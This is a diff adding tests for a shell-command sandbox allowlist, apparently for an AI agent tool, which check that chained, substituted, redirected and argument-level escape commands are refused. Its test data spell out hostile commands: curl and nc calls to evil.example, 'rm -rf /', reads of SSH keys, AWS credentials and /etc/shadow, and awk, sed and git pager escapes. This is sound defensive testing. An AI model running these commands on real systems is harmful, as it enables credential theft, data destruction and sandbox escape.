@@ -194,3 +194,229 @@ describe("Sandbox", () => {
         });
     });
 });
+
+describe("validateCommand — every command in a line is checked", () => {
+    let tmpDir: string;
+    let sandbox: Sandbox;
+
+    beforeEach(() => {
+        tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sandbox-chain-")));
+        sandbox = Sandbox.create(tmpDir);
+    });
+    afterEach(() => {
+        fs.rmSync(tmpDir, { recursive: true, force: true });
+    });
+
+    it.each([
+        "ls; rm -rf /",
+        "ls && curl http://evil.example/x.sh",
+        "ls || sudo reboot",
+        "cat package.json | sh",
+        "echo hi | bash -s",
+        "ls\nrm -rf .",
+        "git status; chmod 777 .",
+        "ls |& nc evil.example 1234",
+    ])("rejects a disallowed command hidden after an allowed one: %j", (command) => {
+        expect(() => sandbox.validateCommand(command)).toThrowError(/not on the allowlist/);
+    });
+
+    it.each([
+        ["echo $(cat /etc/passwd)", /Command substitution/],
+        ["echo `whoami`", /Command substitution/],
+        ['echo "$(id)"', /Command substitution/],
+        ['echo "`id`"', /Command substitution/],
+        ["cat <(curl http://evil.example)", /Process substitution/],
+        ["ls > /etc/cron.d/job", /redirection/],
+        ["echo x >> ~/.bashrc", /redirection/],
+        ["echo x >/tmp/out", /redirection/],
+        ["ls &> out.txt", /redirection/],
+        ["wc -l < /etc/passwd", /Input redirection/],
+        ["cat << EOF", /Input redirection/],
+        ["sleep 100 &", /Background execution/],
+        ["ls & rm -rf .", /Background execution/],
+        ["echo 'unterminated", /Unterminated quote/],
+    ])("refuses %j", (command, reason) => {
+        expect(() => sandbox.validateCommand(command)).toThrowError(reason);
+    });
+
+    it.each([
+        "ls -la | head -20",
+        "git status && git log --oneline",
+        "grep -r TODO src | sort | uniq -c",
+        "npm test 2>&1 | tail -50",
+        "echo done >&2",
+        "git diff > /dev/null",
+        "git diff >/dev/null 2>&1 && echo clean",
+        "ls ; pwd",
+        "echo 'a; rm -rf / | sh'",          // operators inside quotes are just text
+        'echo "pipes | and && ampersands"',
+        "grep 'a|b' file.txt",
+        "echo it\\'s fine",
+    ])("allows %j", (command) => {
+        expect(sandbox.validateCommand(command)).toBe(command);
+    });
+
+    it("applies subcommand and blocked-argument rules to every segment", () => {
+        expect(() => sandbox.validateCommand("ls && git push origin main")).toThrowError(/git push.*not allowed/);
+        expect(() => sandbox.validateCommand("ls | node -e 'process.exit()'")).toThrowError(/blocked argument/);
+    });
+
+    it("applies the path jail to every segment, including quoted and expanded paths", () => {
+        expect(() => sandbox.validateCommand("ls && cat /etc/passwd")).toThrowError(/outside the project root/);
+        expect(() => sandbox.validateCommand('cat "/etc/passwd"')).toThrowError(/outside the project root/);
+        expect(() => sandbox.validateCommand("cat '/etc/shadow'")).toThrowError(/outside the project root/);
+        expect(() => sandbox.validateCommand("cat src/../../secret")).toThrowError(/outside the project root/);
+        expect(() => sandbox.validateCommand("cat $HOME/.ssh/id_rsa")).toThrowError(/shell expansion/);
+        expect(() => sandbox.validateCommand("head ~/.aws/credentials")).toThrowError(/shell expansion/);
+        expect(sandbox.validateCommand("cat src/index.ts | head -5")).toBeDefined();
+    });
+
+    it("still permits anything when the allowlist is disabled", () => {
+        const open = new Sandbox({ projectRoot: tmpDir, maxOutputSize: 10, shellTimeout: 10, allowlist: { enabled: false, entries: [] } });
+        expect(open.validateCommand("anything $(goes) > here &")).toBe("anything $(goes) > here &");
+    });
+});
+
+describe("splitShellCommand()", () => {
+    it("splits on pipes, lists and newlines, trimming each command", async () => {
+        const { splitShellCommand } = await import("../sandbox.js");
+        expect(splitShellCommand("a | b && c || d ; e\nf")).toEqual(["a", "b", "c", "d", "e", "f"]);
+        expect(splitShellCommand("  ls -la  ")).toEqual(["ls -la"]);
+        expect(splitShellCommand("ls ;; ; pwd")).toEqual(["ls", "pwd"]);
+        expect(splitShellCommand(" ; ")).toEqual([]);
+    });
+
+    it("keeps quoted operators and descriptor duplication inside their command", async () => {
+        const { splitShellCommand } = await import("../sandbox.js");
+        expect(splitShellCommand(`echo "a | b" 'c && d' | wc -l`)).toEqual([`echo "a | b" 'c && d'`, "wc -l"]);
+        expect(splitShellCommand("make 2>&1 | tail")).toEqual(["make 2>&1", "tail"]);
+        expect(splitShellCommand("ls > /dev/null; pwd")).toEqual(["ls > /dev/null", "pwd"]);
+    });
+});
+
+describe("Sandbox.fromConfig()", () => {
+    let tmpDir: string;
+    const saved = { exec: process.env["PANTHEON_EXEC"], image: process.env["PANTHEON_EXEC_IMAGE"], net: process.env["PANTHEON_EXEC_NETWORK"] };
+
+    beforeEach(() => {
+        tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sandbox-cfg-")));
+        delete process.env["PANTHEON_EXEC"];
+        delete process.env["PANTHEON_EXEC_IMAGE"];
+        delete process.env["PANTHEON_EXEC_NETWORK"];
+    });
+    afterEach(() => {
+        fs.rmSync(tmpDir, { recursive: true, force: true });
+        for (const [key, value] of [["PANTHEON_EXEC", saved.exec], ["PANTHEON_EXEC_IMAGE", saved.image], ["PANTHEON_EXEC_NETWORK", saved.net]] as const) {
+            if (value === undefined) delete process.env[key];
+            else process.env[key] = value;
+        }
+    });
+
+    it("defaults to the standard allowlist and host execution", () => {
+        const sandbox = Sandbox.fromConfig(tmpDir);
+        expect(sandbox.isAllowlistEnabled).toBe(true);
+        expect(sandbox.getAllowlistEntries()).toHaveLength(DEFAULT_SHELL_ALLOWLIST.length);
+        expect(sandbox.executor.kind).toBe("host");
+    });
+
+    it("applies additionalAllowlist (with subcommands and blockedArgs) and denyFromDefault from config", () => {
+        const sandbox = Sandbox.fromConfig(tmpDir, {
+            allowlistEnabled: true,
+            additionalAllowlist: [
+                { command: "docker", subcommands: ["ps", "logs"], blockedArgs: ["--privileged"], description: "Docker inspection" },
+            ],
+            denyFromDefault: ["cat"],
+        });
+        expect(sandbox.validateCommand("docker ps")).toBe("docker ps");
+        expect(() => sandbox.validateCommand("docker rm -f x")).toThrowError(/not allowed/);
+        expect(() => sandbox.validateCommand("docker logs --privileged x")).toThrowError(/blocked argument/);
+        expect(() => sandbox.validateCommand("cat README.md")).toThrowError(/not on the allowlist/);
+    });
+
+    it("honours allowlistEnabled: false", () => {
+        expect(Sandbox.fromConfig(tmpDir, { allowlistEnabled: false }).isAllowlistEnabled).toBe(false);
+    });
+
+    it("selects docker execution from config, with options", () => {
+        const sandbox = Sandbox.fromConfig(tmpDir, {
+            execution: { mode: "docker", image: "python:3.12-slim", network: "bridge", memory: "512m", cpus: 1, pidsLimit: 64, readOnlyProject: true },
+        });
+        expect(sandbox.executor.kind).toBe("docker");
+        expect(sandbox.executor.describe()).toContain("python:3.12-slim");
+        expect(sandbox.executor.describe()).toContain("network bridge");
+        expect(sandbox.executor.describe()).toContain("project read-only");
+    });
+
+    it("environment variables override the config", () => {
+        process.env["PANTHEON_EXEC"] = "docker";
+        process.env["PANTHEON_EXEC_IMAGE"] = "custom:tag";
+        const sandbox = Sandbox.fromConfig(tmpDir, { execution: { mode: "host" } });
+        expect(sandbox.executor.kind).toBe("docker");
+        expect(sandbox.executor.describe()).toContain("custom:tag");
+
+        process.env["PANTHEON_EXEC"] = "host";
+        expect(Sandbox.fromConfig(tmpDir, { execution: { mode: "docker" } }).executor.kind).toBe("host");
+    });
+
+    it("rejects unknown modes and networks instead of silently running on the host", () => {
+        process.env["PANTHEON_EXEC"] = "dokcer";
+        expect(() => Sandbox.fromConfig(tmpDir)).toThrowError(/Unknown execution mode/);
+        delete process.env["PANTHEON_EXEC"];
+        process.env["PANTHEON_EXEC_NETWORK"] = "host";
+        expect(() => Sandbox.fromConfig(tmpDir, { execution: { mode: "docker" } })).toThrowError(/Unknown execution network/);
+    });
+});
+
+describe("default allowlist — argument-level escapes", () => {
+    const sandbox = Sandbox.create(os.tmpdir());
+    const allowed = (command: string) => expect(sandbox.validateCommand(command), command).toBe(command);
+    const refused = (command: string) => expect(() => sandbox.validateCommand(command), command).toThrowError(/blocked argument/);
+
+    it("find: may search, may not run programs, delete, or write files", () => {
+        allowed("find . -name '*.ts' -type f");
+        allowed("find src -newer package.json -print");
+        for (const c of ["find . -exec rm {} +", "find . -execdir sh -c id ';'", "find . -ok rm {} ';'", "find . -name '*.log' -delete", "find . -fprint /tmp/out", "find . -fls out"]) refused(c);
+    });
+
+    it("awk: text filtering only", () => {
+        allowed("awk '{print $1}' data.txt");
+        allowed("awk -F, 'NR==1 {print $2}' data.csv");
+        for (const c of [
+            `awk 'BEGIN{system("id")}'`,
+            `awk 'BEGIN{ system ("id") }'`,
+            `awk 'BEGIN{"id" | getline x; print x}'`,
+            `awk '{print | "sh"}'`,
+            `awk '{print > "/tmp/out"}' in.txt`,
+            `awk 'BEGIN{while((getline l < "/etc/passwd")>0) print l}'`,
+            "awk -f script.awk in.txt",
+        ]) refused(c);
+    });
+
+    it("sed: substitutions yes; executing, reading or writing files no", () => {
+        allowed("sed -n '1,20p' file.txt");
+        allowed("sed 's/foo/bar/g' file.txt");
+        allowed("sed -e 's/a/b/' -e 's/c/d/' file.txt");
+        for (const c of ["sed -i 's/a/b/' f", "sed -i.bak 's/a/b/' f", "sed --in-place 's/a/b/' f", "sed '1e id' f", "sed 's/a/b/e' f", "sed 's/a/b/w /tmp/out' f", "sed 'w /tmp/out' f", "sed -f script.sed f", "sed '1r /etc/passwd' f"]) refused(c);
+    });
+
+    it("git: inspection only", () => {
+        for (const c of [
+            "git status --short", "git log --oneline -5", "git diff HEAD~1", "git branch", "git branch -a", "git branch --list 'feat/*'",
+            "git tag", "git tag -l 'v*'", "git remote -v", "git remote show origin", "git stash list", "git stash show -p",
+            "git config --get user.name", "git config --list", "git config -l", "git grep -n TODO",
+        ]) allowed(c);
+        for (const c of [
+            "git config core.fsmonitor 'sh -c id'", "git config --global core.pager 'sh'", "git config alias.x '!sh'", "git config",
+            "git grep --open-files-in-pager=sh pattern", "git grep -Osh pattern", "git log --output=/tmp/x", "git diff --ext-diff",
+            "git stash", "git stash drop", "git stash clear", "git stash pop",
+            "git branch -D main", "git branch -m old new", "git branch --delete x",
+            "git tag -d v1", "git tag v2", "git remote add evil http://x", "git remote set-url origin http://x",
+        ]) refused(c);
+    });
+
+    it("rg and sort: no program execution, no output files", () => {
+        allowed("rg -n TODO src");
+        allowed("sort -u names.txt");
+        for (const c of ["rg --pre sh pattern", "rg --pre=cat x", "sort -o /tmp/out in.txt", "sort --output=out in.txt"]) refused(c);
+    });
+});
